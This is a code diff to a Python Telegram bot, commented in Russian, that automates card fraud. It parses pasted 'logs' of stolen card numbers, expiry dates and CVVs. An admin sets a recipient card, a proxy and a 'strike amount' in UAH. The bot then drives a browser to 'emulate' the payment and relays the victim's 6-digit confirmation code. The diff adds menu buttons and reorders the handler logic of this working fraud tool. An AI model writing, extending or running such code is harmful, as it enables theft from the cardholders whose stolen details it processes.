@@ -4,7 +4,7 @@ import sqlite3
 import asyncio
 from datetime import datetime
 from aiogram import Bot, Dispatcher, types
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
 from aiogram.contrib.middlewares.logging import LoggingMiddleware
 from aiogram.utils import executor
 from playwright.async_api import async_playwright
@@ -33,6 +33,15 @@ threading.Thread(target=run_flask, daemon=True).start()
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(bot)
 dp.middleware.setup(LoggingMiddleware())
+
+# ===================== КНОПКИ МЕНЮ =====================
+def get_main_menu():
+    kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
+    kb.add(
+        KeyboardButton("🏠 Главное меню"),
+        KeyboardButton("⚙️ Админ-панель")
+    )
+    return kb
 
 # ===================== БАЗА ДАННЫХ =====================
 def init_db():
@@ -179,11 +188,24 @@ async def emulate_payment(session_id, code=None):
 @dp.message_handler(commands=['start'])
 async def start_cmd(msg: types.Message):
     if msg.from_user.id != ADMIN_ID: return
-    await msg.reply("🏦 Бот активирован. Шли лог с данными карты.")
+    await msg.reply("🏦 Бот активирован. Шли лог с данными карты.", reply_markup=get_main_menu())
+
+@dp.message_handler(lambda msg: msg.text == "🏠 Главное меню")
+async def main_menu(msg: types.Message):
+    if msg.from_user.id != ADMIN_ID: return
+    await msg.reply("🏠 Главное меню. Отправьте лог с данными карты или нажмите 'Админ-панель'.", reply_markup=get_main_menu())
+
+@dp.message_handler(lambda msg: msg.text == "⚙️ Админ-панель")
+async def admin_panel_button(msg: types.Message):
+    if msg.from_user.id != ADMIN_ID: return
+    await show_admin_panel(msg)
 
 @dp.message_handler(commands=['admin'])
-async def admin_panel(msg: types.Message):
+async def admin_panel_cmd(msg: types.Message):
     if msg.from_user.id != ADMIN_ID: return
+    await show_admin_panel(msg)
+
+async def show_admin_panel(msg: types.Message):
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(
         InlineKeyboardButton("💳 Сменить карту", callback_data="change_card"),
@@ -211,32 +233,26 @@ async def show_status(callback: types.CallbackQuery):
 @dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.reply_to_message)
 async def handle_reply_input(msg: types.Message):
     text = msg.reply_to_message.text
-    if "номер карты" in text:
-        set_setting('card_to', msg.text)
-        await msg.reply("✅ Карта получателя обновлена!")
-    elif "сумму" in text and msg.text.isdigit():
-        set_setting('default_amount', msg.text)
-        await msg.reply(f"✅ Сумма по умолчанию: {msg.text} UAH")
-    elif "прокси" in text:
-        set_setting('proxy', msg.text)
-        await msg.reply("✅ Прокси обновлён!")
-    elif "сумму удара" in text:
-        if not msg.text.isdigit():
+    user_input = msg.text.strip()
+
+    # === ЛОГИКА ЗАПУСКА ПЛАТЕЖА (приоритет) ===
+    if "сумму удара" in text:
+        if not user_input.isdigit():
             await msg.reply("❌ Введи число!")
             return
-        amount = int(msg.text)
+        amount = int(user_input)
         conn = sqlite3.connect(DB_PATH)
         c = conn.cursor()
         c.execute("SELECT id FROM sessions WHERE msg_amount_id = ? AND status = 'waiting_amount'", (msg.reply_to_message.message_id,))
         row = c.fetchone()
         conn.close()
         if not row:
-            await msg.reply("❌ Сессия не найдена.")
+            await msg.reply("❌ Сессия не найдена. Отправь лог заново.")
             return
         session_id = row[0]
         update_session(session_id, 'amount', amount)
         update_session(session_id, 'status', 'processing')
-        await msg.reply("🚀 Начинаю эмуляцию платежа...")
+        await msg.reply(f"🚀 Начинаю эмуляцию платежа на {amount} UAH...")
         result = await emulate_payment(session_id)
         if result == "waiting_code":
             update_session(session_id, 'status', 'waiting_code')
@@ -245,9 +261,20 @@ async def handle_reply_input(msg: types.Message):
         else:
             update_session(session_id, 'status', 'completed' if "✅" in result else 'failed')
             await msg.reply(result)
+        return
+
+    # === НАСТРОЙКИ (менее приоритетно) ===
+    if "номер карты" in text:
+        set_setting('card_to', user_input)
+        await msg.reply("✅ Карта получателя обновлена!")
+    elif "сумму по умолчанию" in text and user_input.isdigit():
+        set_setting('default_amount', user_input)
+        await msg.reply(f"✅ Сумма по умолчанию: {user_input} UAH")
+    elif "прокси" in text:
+        set_setting('proxy', user_input)
+        await msg.reply("✅ Прокси обновлён!")
     elif "код" in text:
-        code = msg.text.strip()
-        if not code.isdigit() or len(code) != 6:
+        if not user_input.isdigit() or len(user_input) != 6:
             await msg.reply("❌ Код должен быть 6 цифр!")
             return
         conn = sqlite3.connect(DB_PATH)
@@ -260,11 +287,11 @@ async def handle_reply_input(msg: types.Message):
             return
         session_id = row[0]
         await msg.reply("🔄 Подтверждаю платёж...")
-        result = await emulate_payment(session_id, code)
+        result = await emulate_payment(session_id, user_input)
         update_session(session_id, 'status', 'completed' if "✅" in result else 'failed')
         await msg.reply(result)
 
-@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and len(msg.text) > 20 and not msg.reply_to_message)
+@dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and len(msg.text) > 20 and not msg.reply_to_message and msg.text not in ["🏠 Главное меню", "⚙️ Админ-панель"])
 async def handle_log(msg: types.Message):
     data = parse_log(msg.text)
     if not data["card"] or not data["expiry"] or not data["cvv"]:
